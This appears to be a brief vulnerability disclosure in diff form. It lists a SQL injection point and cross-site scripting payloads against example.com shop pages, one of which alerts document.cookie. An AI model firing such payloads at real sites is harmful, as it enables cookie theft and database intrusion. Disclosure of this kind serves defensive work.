@@ -1,0 +1,5 @@
+http://www.example.com/index.php?cat_id= [ SQL injection ]
+
+http://www.example.com/sale_cat.php/&quot; [ XSS ]
+http://www.example.com/sale_cat.php/&quot;&lt;script&gt;alert(12345)&lt;/script&gt;
+http://www.example.com/sale_cat.php/&quot;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
